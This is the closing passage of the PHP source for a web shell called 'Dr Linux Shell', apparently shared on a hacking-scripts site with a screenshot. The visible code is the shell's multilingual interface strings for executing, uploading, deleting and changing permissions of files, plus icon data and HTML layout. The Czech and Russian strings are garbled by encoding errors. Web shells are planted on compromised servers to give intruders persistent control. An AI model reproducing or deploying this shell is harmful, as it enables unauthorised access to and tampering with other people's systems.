'not_copied' =&gt; "Estos archivos no pudieron ser copiados \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" no pudo ser editado.',
'executed' =&gt; "\"[%1]\" ha sido ejecutado correctamente:\n{%2}",
'not_executed' =&gt; "\"[%1]\" no pudo ser ejecutado correctamente:\n{%2}",
'saved' =&gt; '"[%1]" ha sido salvado.',
'not_saved' =&gt; '"[%1]" no pudo ser salvado.',
'symlinked' =&gt; 'Enlace desde "[%2]" a "[%1]" ha sido creado.',
'not_symlinked' =&gt; 'Enlace desde "[%2]" a "[%1]" no pudo ser creado.',
'permission_for' =&gt; 'Permisos de "[%1]":',
'permission_set' =&gt; 'Permisos de "[%1]" fueron seteados a [%2].',
'permission_not_set' =&gt; 'Permisos de "[%1]" no pudo ser seteado a [%2].',
'not_readable' =&gt; '"[%1]" no pudo ser leído.'
		);

	case 'dk':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Mappe',
'file' =&gt; 'Fil',
'filename' =&gt; 'Filnavn',

'size' =&gt; 'Størrelse',
'permission' =&gt; 'Rettighed',
'owner' =&gt; 'Ejer',
'group' =&gt; 'Gruppe',
'other' =&gt; 'Andre',
'functions' =&gt; 'Funktioner',

'read' =&gt; 'læs',
'write' =&gt; 'skriv',
'execute' =&gt; 'kør',

'create_symlink' =&gt; 'opret symbolsk link',
'delete' =&gt; 'slet',
'rename' =&gt; 'omdøb',
'move' =&gt; 'flyt',
'copy' =&gt; 'kopier',
'edit' =&gt; 'rediger',
'download' =&gt; 'download',
'upload' =&gt; 'upload',
'create' =&gt; 'opret',
'change' =&gt; 'skift',
'save' =&gt; 'gem',
'set' =&gt; 'sæt',
'reset' =&gt; 'nulstil',
'relative' =&gt; 'Relativ sti til valg',

'yes' =&gt; 'Ja',
'no' =&gt; 'Nej',
'back' =&gt; 'tilbage',
'destination' =&gt; 'Distination',
'symlink' =&gt; 'Symbolsk link',
'no_output' =&gt; 'ingen resultat',

'user' =&gt; 'Bruger',
'password' =&gt; 'Kodeord',
'add' =&gt; 'tilføj',
'add_basic_auth' =&gt; 'tilføj grundliggende rettigheder',

'uploaded' =&gt; '"[%1]" er blevet uploaded.',
'not_uploaded' =&gt; '"[%1]" kunnu ikke uploades.',
'already_exists' =&gt; '"[%1]" findes allerede.',
'created' =&gt; '"[%1]" er blevet oprettet.',
'not_created' =&gt; '"[%1]" kunne ikke oprettes.',
'really_delete' =&gt; 'Slet disse filer?',
'deleted' =&gt; "Disse filer er blevet slettet:\n[%1]",
'not_deleted' =&gt; "Disse filer kunne ikke slettes:\n[%1]",
'rename_file' =&gt; 'Omdød fil:',
'renamed' =&gt; '"[%1]" er blevet omdøbt til "[%2]".',
'not_renamed' =&gt; '"[%1] kunne ikke omdøbes til "[%2]".',
'move_files' =&gt; 'Flyt disse filer:',
'moved' =&gt; "Disse filer er blevet flyttet til \"[%2]\":\n[%1]",
'not_moved' =&gt; "Disse filer kunne ikke flyttes til \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Kopier disse filer:',
'copied' =&gt; "Disse filer er kopieret til \"[%2]\":\n[%1]",
'not_copied' =&gt; "Disse filer kunne ikke kopieres til \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" kan ikke redigeres.',
'executed' =&gt; "\"[%1]\" er blevet kørt korrekt:\n{%2}",
'not_executed' =&gt; "\"[%1]\" kan ikke køres korrekt:\n{%2}",
'saved' =&gt; '"[%1]" er blevet gemt.',
'not_saved' =&gt; '"[%1]" kunne ikke gemmes.',
'symlinked' =&gt; 'Symbolsk link fra "[%2]" til "[%1]" er blevet oprettet.',
'not_symlinked' =&gt; 'Symbolsk link fra "[%2]" til "[%1]" kunne ikke oprettes.',
'permission_for' =&gt; 'Rettigheder for "[%1]":',
'permission_set' =&gt; 'Rettigheder for "[%1]" blev sat til [%2].',
'permission_not_set' =&gt; 'Rettigheder for "[%1]" kunne ikke sættes til [%2].',
'not_readable' =&gt; '"[%1]" Kan ikke læses.'
		);

	case 'tr':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Klasör',
'file' =&gt; 'Dosya',
'filename' =&gt; 'dosya adi',

'size' =&gt; 'boyutu',
'permission' =&gt; 'Izin',
'owner' =&gt; 'sahib',
'group' =&gt; 'Grup',
'other' =&gt; 'Digerleri',
'functions' =&gt; 'Fonksiyonlar',

'read' =&gt; 'oku',
'write' =&gt; 'yaz',
'execute' =&gt; 'çalistir',

'create_symlink' =&gt; 'yarat symlink',
'delete' =&gt; 'sil',
'rename' =&gt; 'ad degistir',
'move' =&gt; 'tasi',
'copy' =&gt; 'kopyala',
'edit' =&gt; 'düzenle',
'download' =&gt; 'indir',
'upload' =&gt; 'yükle',
'create' =&gt; 'create',
'change' =&gt; 'degistir',
'save' =&gt; 'kaydet',
'set' =&gt; 'ayar',
'reset' =&gt; 'sifirla',
'relative' =&gt; 'Hedef yola göre',

'yes' =&gt; 'Evet',
'no' =&gt; 'Hayir',
'back' =&gt; 'Geri',
'destination' =&gt; 'Hedef',
'symlink' =&gt; 'Kýsa yol',
'no_output' =&gt; 'çikti yok',

'user' =&gt; 'Kullanici',
'password' =&gt; 'Sifre',
'add' =&gt; 'ekle',
'add_basic_auth' =&gt; 'ekle basit-authentification',

'uploaded' =&gt; '"[%1]" yüklendi.',
'not_uploaded' =&gt; '"[%1]" yüklenemedi.',
'already_exists' =&gt; '"[%1]" kullanilmakta.',
'created' =&gt; '"[%1]" olusturuldu.',
'not_created' =&gt; '"[%1]" olusturulamadi.',
'really_delete' =&gt; 'Bu dosyalari silmek istediginizden eminmisiniz?',
'deleted' =&gt; "Bu dosyalar silindi:\n[%1]",
'not_deleted' =&gt; "Bu dosyalar silinemedi:\n[%1]",
'rename_file' =&gt; 'Adi degisen dosya:',
'renamed' =&gt; '"[%1]" adili dosyanin yeni adi "[%2]".',
'not_renamed' =&gt; '"[%1] adi degistirilemedi "[%2]" ile.',
'move_files' =&gt; 'Tasinan dosyalar:',
'moved' =&gt; "Bu dosyalari tasidiginiz yer \"[%2]\":\n[%1]",
'not_moved' =&gt; "Bu dosyalari tasiyamadiginiz yer \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Kopyalanan dosyalar:',
'copied' =&gt; "Bu dosyalar kopyalandi \"[%2]\":\n[%1]",
'not_copied' =&gt; "Bu dosyalar kopyalanamiyor \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" düzenlenemiyor.',
'executed' =&gt; "\"[%1]\" basariyla çalistirildi:\n{%2}",
'not_executed' =&gt; "\"[%1]\" çalistirilamadi:\n{%2}",
'saved' =&gt; '"[%1]" kaydedildi.',
'not_saved' =&gt; '"[%1]" kaydedilemedi.',
'symlinked' =&gt; '"[%2]" den "[%1]" e kýsayol oluþturuldu.',
'not_symlinked' =&gt; '"[%2]"den "[%1]" e kýsayol oluþturulamadý.',
'permission_for' =&gt; 'Izinler "[%1]":',
'permission_set' =&gt; 'Izinler "[%1]" degistirildi [%2].',
'permission_not_set' =&gt; 'Izinler "[%1]" degistirilemedi [%2].',
'not_readable' =&gt; '"[%1]" okunamiyor.'
		);

	case 'cs':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'UTF-8';

		return array(
'directory' =&gt; 'AdresÃ¡Å™',
'file' =&gt; 'Soubor',
'filename' =&gt; 'JmÃ©no souboru',

'size' =&gt; 'Velikost',
'permission' =&gt; 'PrÃ¡va',
'owner' =&gt; 'VlastnÃ­k',
'group' =&gt; 'Skupina',
'other' =&gt; 'OstatnÃ­',
'functions' =&gt; 'Funkce',

'read' =&gt; 'ÄŒtenÃ­',
'write' =&gt; 'ZÃ¡pis',
'execute' =&gt; 'SpouÅ¡tÄ›nÃ­',

'create_symlink' =&gt; 'VytvoÅ™it symbolickÃ½ odkaz',
'delete' =&gt; 'Smazat',
'rename' =&gt; 'PÅ™ejmenovat',
'move' =&gt; 'PÅ™esunout',
'copy' =&gt; 'ZkopÃ­rovat',
'edit' =&gt; 'OtevÅ™Ã­t',
'download' =&gt; 'StÃ¡hnout',
'upload' =&gt; 'Nahraj na server',
'create' =&gt; 'VytvoÅ™it',
'change' =&gt; 'ZmÄ›nit',
'save' =&gt; 'UloÅ¾it',
'set' =&gt; 'Nastavit',
'reset' =&gt; 'zpÄ›t',
'relative' =&gt; 'Relatif',

'yes' =&gt; 'Ano',
'no' =&gt; 'Ne',
'back' =&gt; 'ZpÄ›t',
'destination' =&gt; 'Destination',
'symlink' =&gt; 'SymbolickÃ½ odkaz',
'no_output' =&gt; 'PrÃ¡zdnÃ½ vÃ½stup',

'user' =&gt; 'UÅ¾ivatel',
'password' =&gt; 'Heslo',
'add' =&gt; 'PÅ™idat',
'add_basic_auth' =&gt; 'pÅ™idej zÃ¡kladnÃ­ autentizaci',

'uploaded' =&gt; 'Soubor "[%1]" byl nahrÃ¡n na server.',
'not_uploaded' =&gt; 'Soubor "[%1]" nebyl nahrÃ¡n na server.',
'already_exists' =&gt; 'Soubor "[%1]" uÅ¾ exituje.',
'created' =&gt; 'Soubor "[%1]" byl vytvoÅ™en.',
'not_created' =&gt; 'Soubor "[%1]" nemohl bÃ½t  vytvoÅ™en.',
'really_delete' =&gt; 'Vymazat soubor?',
'deleted' =&gt; "Byly vymazÃ¡ny tyto soubory:\n[%1]",
'not_deleted' =&gt; "Tyto soubory nemohly bÃ½t vytvoÅ™eny:\n[%1]",
'rename_file' =&gt; 'PÅ™ejmenuj soubory:',
'renamed' =&gt; 'Soubor "[%1]" byl pÅ™ejmenovÃ¡n na "[%2]".',
'not_renamed' =&gt; 'Soubor "[%1]" nemohl bÃ½t pÅ™ejmenovÃ¡n na "[%2]".',
'move_files' =&gt; 'PÅ™emÃ­stit tyto soubory:',
'moved' =&gt; "Tyto soubory byly pÅ™emÃ­stÄ›ny do \"[%2]\":\n[%1]",
'not_moved' =&gt; "Tyto soubory nemohly bÃ½t pÅ™emÃ­stÄ›ny do \"[%2]\":\n[%1]",
'copy_files' =&gt; 'ZkopÃ­rovat tyto soubory:',
'copied' =&gt; "Tyto soubory byly zkopÃ­rovÃ¡ny do \"[%2]\":\n[%1]",
'not_copied' =&gt; "Tyto soubory nemohly bÃ½t zkopÃ­rovÃ¡ny do \"[%2]\":\n[%1]",
'not_edited' =&gt; 'Soubor "[%1]" nemohl bÃ½t otevÅ™en.',
'executed' =&gt; "SOubor \"[%1]\" byl spuÅ¡tÄ›n :\n{%2}",
'not_executed' =&gt; "Soubor \"[%1]\" nemohl bÃ½t spuÅ¡tÄ›n:\n{%2}",
'saved' =&gt; 'Soubor "[%1]" byl uloÅ¾en.',
'not_saved' =&gt; 'Soubor "[%1]" nemohl bÃ½t uloÅ¾en.',
'symlinked' =&gt; 'Byl vyvoÅ™en symbolickÃ½ odkaz "[%2]" na soubor "[%1]".',
'not_symlinked' =&gt; 'SymbolickÃ½ odkaz "[%2]" na soubor "[%1]" nemohl bÃ½t vytvoÅ™en.',
'permission_for' =&gt; 'PrÃ¡va k "[%1]":',
'permission_set' =&gt; 'PrÃ¡va k "[%1]" byla zmÄ›nÄ›na na [%2].',
'permission_not_set' =&gt; 'PrÃ¡va k "[%1]" nemohla bÃ½t zmÄ›nÄ›na na [%2].',
'not_readable' =&gt; 'Soubor "[%1]" nenÃ­ moÅ¾no pÅ™eÄÃ­st.'
		);

	case 'ru':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'KOI8-R';

		return array(
'directory' =&gt; 'ëÁÔÁÌÏÇ',
'file' =&gt; 'æÁÊÌ',
'filename' =&gt; 'éÍÑ ÆÁÊÌÁ',

'size' =&gt; 'òÁÚÍÅÒ',
'permission' =&gt; 'ðÒÁ×Á',
'owner' =&gt; 'èÏÚÑÉÎ',
'group' =&gt; 'çÒÕÐÐÁ',
'other' =&gt; 'äÒÕÇÉÅ',
'functions' =&gt; 'æÕÎËÃÉÑ',

'read' =&gt; 'ÞÉÔÁÔØ',
'write' =&gt; 'ÐÉÓÁÔØ',
'execute' =&gt; '×ÙÐÏÌÎÉÔØ',

'create_symlink' =&gt; 'óÄÅÌÁÔØ ÓÉÍÌÉÎË',
'delete' =&gt; 'ÕÄÁÌÉÔØ',
'rename' =&gt; 'ÐÅÒÅÉÍÅÎÏ×ÁÔØ',
'move' =&gt; 'ÐÅÒÅÄ×ÉÎÕÔØ',
'copy' =&gt; 'ËÏÐÉÒÏ×ÁÔØ',
'edit' =&gt; 'ÒÅÄÁËÔÉÒÏ×ÁÔØ',
'download' =&gt; 'ÓËÁÞÁÔØ',
'upload' =&gt; 'ÚÁËÁÞÁÔØ',
'create' =&gt; 'ÓÄÅÌÁÔØ',
'change' =&gt; 'ÐÏÍÅÎÑÔØ',
'save' =&gt; 'ÓÏÈÒÁÎÉÔØ',
'set' =&gt; 'ÕÓÔÁÎÏ×ÉÔØ',
'reset' =&gt; 'ÓÂÒÏÓÉÔØ',
'relative' =&gt; 'ÏÔÎÏÓÉÔÅÌØÎÙÊ ÐÕÔØ Ë ÃÅÌÉ',

'yes' =&gt; 'ÄÁ',
'no' =&gt; 'ÎÅÔ',
'back' =&gt; 'ÎÁÚÁÄ',
'destination' =&gt; 'ÃÅÌØ',
'symlink' =&gt; 'ÓÉÍ×ÏÌÉÞÅÓËÉÊ ÌÉÎË',
'no_output' =&gt; 'ÎÅÔ ×Ù×ÏÄÁ',

'user' =&gt; 'ðÏÌØÚÏ×ÁÔÅÌØ',
'password' =&gt; 'ðÁÒÏÌØ',
'add' =&gt; 'ÄÏÂÁ×ÉÔØ',
'add_basic_auth' =&gt; 'äÏÂÁ×ÉÔØ HTTP-Basic-Auth',

'uploaded' =&gt; '"[%1]" ÂÙÌ ÚÁËÁÞÅÎ.',
'not_uploaded' =&gt; '"[%1]" ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÚÁËÁÞÑÔØ.',
'already_exists' =&gt; '"[%1]" ÕÖÅ ÓÕÝÅÓÔ×ÕÅÔ.',
'created' =&gt; '"[%1]" ÂÙÌ ÓÄÅÌÁÎ.',
'not_created' =&gt; '"[%1]" ÎÅ ×ÏÚÍÏÖÎÏ ÓÄÅÌÁÔØ.',
'really_delete' =&gt; 'äÅÊÓÔ×ÉÔÅÌØÎÏ ÜÔÏÔ ÆÁÊÌ ÕÄÁÌÉÔØ?',
'deleted' =&gt; "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÂÙÌÉ ÕÄÁÌÅÎÙ:\n[%1]",
'not_deleted' =&gt; "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÎÅ ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÕÄÁÌÉÔØ:\n[%1]",
'rename_file' =&gt; 'ðÅÒÅÉÍÅÎÏ×Ù×ÁÀ ÆÁÊÌ:',
'renamed' =&gt; '"[%1]" ÂÙÌ ÐÅÒÅÉÍÅÎÏ×ÁÎ ÎÁ "[%2]".',
'not_renamed' =&gt; '"[%1] ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÐÅÒÅÉÍÅÎÏ×ÁÔØ ÎÁ "[%2]".',
'move_files' =&gt; 'ðÅÒÅÄ×ÉÇÁÀ ÓÌÅÄÕÀÝÉÅ ÆÁÊÌÙ:',
'moved' =&gt; "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÂÙÌÉ ÐÅÒÅÄ×ÉÎÕÔÙ × ËÁÔÁÌÏÇ \"[%2]\":\n[%1]",
'not_moved' =&gt; "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÐÅÒÅÄ×ÉÎÕÔØ × ËÁÔÁÌÏÇ \"[%2]\":\n[%1]",
'copy_files' =&gt; 'ëÏÐÉÒÕÀ ÓÌÅÄÕÝÉÅ ÆÁÊÌÙ:',
'copied' =&gt; "óÌÅÄÕÝÉÅ ÆÁÊÌÙ ÂÙÌÙ ÓËÏÐÉÒÏ×ÁÎÙ × ËÁÔÁÌÏÇ \"[%2]\" :\n[%1]",
'not_copied' =&gt; "óÌÅÄÕÀÝÉÅ ÆÁÊÌÙ ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÓËÏÐÉÒÏ×ÁÔØ × ËÁÔÁÌÏÇ \"[%2]\" :\n[%1]",
'not_edited' =&gt; '"[%1]" ÎÅ ÍÏÖÅÔ ÂÙÔØ ÏÔÒÅÄÁËÔÉÒÏ×ÁÎ.',
'executed' =&gt; "\"[%1]\" ÂÙÌ ÕÓÐÅÛÎÏ ÉÓÐÏÌÎÅÎ:\n{%2}",
'not_executed' =&gt; "\"[%1]\" ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÚÁÐÕÓÔÉÔØ ÎÁ ÉÓÐÏÌÎÅÎÉÅ:\n{%2}",
'saved' =&gt; '"[%1]" ÂÙÌ ÓÏÈÒÁÎÅÎ.',
'not_saved' =&gt; '"[%1]" ÎÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÓÏÈÒÁÎÉÔØ.',
'symlinked' =&gt; 'óÉÍÌÉÎË Ó "[%2]" ÎÁ "[%1]" ÂÙÌ ÓÄÅÌÁÎ.',
'not_symlinked' =&gt; 'îÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÓÄÅÌÁÔØ ÓÉÍÌÉÎË Ó "[%2]" ÎÁ "[%1]".',
'permission_for' =&gt; 'ðÒÁ×Á ÄÏÓÔÕÐÁ "[%1]":',
'permission_set' =&gt; 'ðÒÁ×Á ÄÏÓÔÕÐÁ "[%1]" ÂÙÌÉ ÉÚÍÅÎÅÎÙ ÎÁ [%2].',
'permission_not_set' =&gt; 'îÅ×ÏÚÍÏÖÎÏ ÂÙÌÏ ÉÚÍÅÎÉÔØ ÐÒÁ×Á ÄÏÓÔÕÐÁ Ë "[%1]" ÎÁ [%2] .',
'not_readable' =&gt; '"[%1]" ÎÅ×ÏÚÍÏÖÎÏ ÐÒÏÞÉÔÁÔØ.'
		);

	case 'en':
	default:

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' =&gt; 'Directory',
'file' =&gt; 'File',
'filename' =&gt; 'Filename',

'size' =&gt; 'Size',
'permission' =&gt; 'Permission',
'owner' =&gt; 'Owner',
'group' =&gt; 'Group',
'other' =&gt; 'Others',
'functions' =&gt; 'Functions',

'read' =&gt; 'read',
'write' =&gt; 'write',
'execute' =&gt; 'execute',

'create_symlink' =&gt; 'create symlink',
'delete' =&gt; 'delete',
'rename' =&gt; 'rename',
'move' =&gt; 'move',
'copy' =&gt; 'copy',
'edit' =&gt; 'edit',
'download' =&gt; 'download',
'upload' =&gt; 'upload',
'create' =&gt; 'create',
'change' =&gt; 'change',
'save' =&gt; 'save',
'set' =&gt; 'set',
'reset' =&gt; 'reset',
'relative' =&gt; 'Relative path to target',

'yes' =&gt; 'Yes',
'no' =&gt; 'No',
'back' =&gt; 'back',
'destination' =&gt; 'Destination',
'symlink' =&gt; 'Symlink',
'no_output' =&gt; 'no output',

'user' =&gt; 'User',
'password' =&gt; 'Password',
'add' =&gt; 'add',
'add_basic_auth' =&gt; 'add basic-authentification',

'uploaded' =&gt; '"[%1]" has been uploaded.',
'not_uploaded' =&gt; '"[%1]" could not be uploaded.',
'already_exists' =&gt; '"[%1]" already exists.',
'created' =&gt; '"[%1]" has been created.',
'not_created' =&gt; '"[%1]" could not be created.',
'really_delete' =&gt; 'Delete these files?',
'deleted' =&gt; "These files have been deleted:\n[%1]",
'not_deleted' =&gt; "These files could not be deleted:\n[%1]",
'rename_file' =&gt; 'Rename file:',
'renamed' =&gt; '"[%1]" has been renamed to "[%2]".',
'not_renamed' =&gt; '"[%1] could not be renamed to "[%2]".',
'move_files' =&gt; 'Move these files:',
'moved' =&gt; "These files have been moved to \"[%2]\":\n[%1]",
'not_moved' =&gt; "These files could not be moved to \"[%2]\":\n[%1]",
'copy_files' =&gt; 'Copy these files:',
'copied' =&gt; "These files have been copied to \"[%2]\":\n[%1]",
'not_copied' =&gt; "These files could not be copied to \"[%2]\":\n[%1]",
'not_edited' =&gt; '"[%1]" can not be edited.',
'executed' =&gt; "\"[%1]\" has been executed successfully:\n{%2}",
'not_executed' =&gt; "\"[%1]\" could not be executed successfully:\n{%2}",
'saved' =&gt; '"[%1]" has been saved.',
'not_saved' =&gt; '"[%1]" could not be saved.',
'symlinked' =&gt; 'Symlink from "[%2]" to "[%1]" has been created.',
'not_symlinked' =&gt; 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' =&gt; 'Permission of "[%1]":',
'permission_set' =&gt; 'Permission of "[%1]" was set to [%2].',
'permission_not_set' =&gt; 'Permission of "[%1]" could not be set to [%2].',
'not_readable' =&gt; '"[%1]" can not be read.'
		);

	}

}

function getimage ($image) {
	switch ($image) {
	case 'file':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///wAAAP///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'folder':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///8zMzP///yH5BAHoAwMALAAAAAARAA0AAAIqnI+ZwKwbYgTPtIudlbwLOgCBQJYmCYrn+m3smY5vGc+0a7dhjh7ZbygAADsA');
	case 'hidden_file':
		return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'link':
		return base64_decode('R0lGODlhEQANAKIEAJmZmf///wAAAMwAAP///wAAAAAAAAAAACH5BAHoAwQALAAAAAARAA0AAAM5SArcrDCCQOuLcIotwgTYUllNOA0DxXkmhY4shM5zsMUKTY8gNgUvW6cnAaZgxMyIM2zBLCaHlJgAADsA');
	case 'smiley':
		return base64_decode('R0lGODlhEQANAJECAAAAAP//AP///wAAACH5BAHoAwIALAAAAAARAA0AAAIslI+pAu2wDAiz0jWD3hqmBzZf1VCleJQch0rkdnppB3dKZuIygrMRE/oJDwUAOwA=');
	case 'arrow':
		return base64_decode('R0lGODlhEQANAIABAAAAAP///yH5BAEKAAEALAAAAAARAA0AAAIdjA9wy6gNQ4pwUmav0yvn+hhJiI3mCJ6otrIkxxQAOw==');
	}
}

function html_header () {
	global $site_charset;

	echo &lt;&lt;&lt;END
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;

&lt;meta http-equiv="Content-Type" content="text/html; charset=$site_charset" /&gt;

&lt;title&gt;Dr.L!nuX&lt;/title&gt;

&lt;style type="text/css"&gt;
body { font: small sans-serif; text-align: center }
img { width: 17px; height: 13px }
a, a:visited { text-decoration: none; color: navy }
hr { border-style: none; height: 1px; background-color: silver; color: silver }
#main { margin-top: 6pt; margin-left: auto; margin-right: auto; border-spacing: 1px }
#main th { background: #eee; padding: 3pt 3pt 0pt 3pt }
.listing th, .listing td { padding: 1px 3pt 0 3pt }
.listing th { border: 1px solid silver }
.listing td { border: 1px solid #ddd; background: white }
.listing .checkbox { text-align: center }
.listing .filename { text-align: left }
.listing .size { text-align: right }
.listing th.permission { text-align: left }
.listing td.permission { font-family: monospace }
.listing .owner { text-align: left }
.listing .group { text-align: left }
.listing .functions { text-align: left }
.listing_footer td { background: #eee; border: 1px solid silver }
#directory, #upload, #create, .listing_footer td, #error td, #notice td { text-align: left; padding: 3pt }
#directory { background: #eee; border: 1px solid silver }
#upload { padding-top: 1em }
#create { padding-bottom: 1em }
.small, .small option { font-size: x-small }
textarea { border: none; background: white }
table.dialog { margin-left: auto; margin-right: auto }
td.dialog { background: #eee; padding: 1ex; border: 1px solid silver; text-align: center }
#permission { margin-left: auto; margin-right: auto }
#permission td { padding-left: 3pt; padding-right: 3pt; text-align: center }
td.permission_action { text-align: right }
#symlink { background: #eee; border: 1px solid silver }
#symlink td { text-align: left; padding: 3pt }
#red_button { width: 120px; color: #400 }
#green_button { width: 120px; color: #040 }
#error td { background: maroon; color: white; border: 1px solid silver }
#notice td { background: green; color: white; border: 1px solid silver }
#notice pre, #error pre { background: silver; color: black; padding: 1ex; margin-left: 1ex; margin-right: 1ex }
code { font-size: 12pt }
td { white-space: nowrap }
&lt;/style&gt;

&lt;script type="text/javascript"&gt;
&lt;!--
function activate (name) {
	if (document && document.forms[0] && document.forms[0].elements['focus']) {
		document.forms[0].elements['focus'].value = name;
	}
}
//--&gt;
&lt;/script&gt;

&lt;/head&gt;
&lt;body&gt;


END;

}

function html_footer () {

	echo &lt;&lt;&lt;END
&lt;/body&gt;
&lt;/html&gt;
END;

}

function notice ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '&lt;tr id="notice"&gt;
	&lt;td colspan="' . $cols . '"&gt;' . phrase($phrase, $args) . '&lt;/td&gt;
&lt;/tr&gt;
';

}

function error ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '&lt;tr id="error"&gt;
	&lt;td colspan="' . $cols . '"&gt;' . phrase($phrase, $args) . '&lt;/td&gt;
&lt;/tr&gt;
';

}

?&gt;
</pre>

## Dr Linux Shell screenshot<figure id="attachment_414" style="width: 698px;" class="wp-caption aligncenter">

[<img src="http://hackingscripts.com/wp/wp-content/uploads/2014/02/dr_linux_shell.png" alt="Dr Linux Shell screenshot" width="698" height="515" class="size-full wp-image-414" />][1]<figcaption class="wp-caption-text">Dr Linux Shell screenshot</figcaption></figure>

 [1]: http://hackingscripts.com/wp/wp-content/uploads/2014/02/dr_linux_shell.png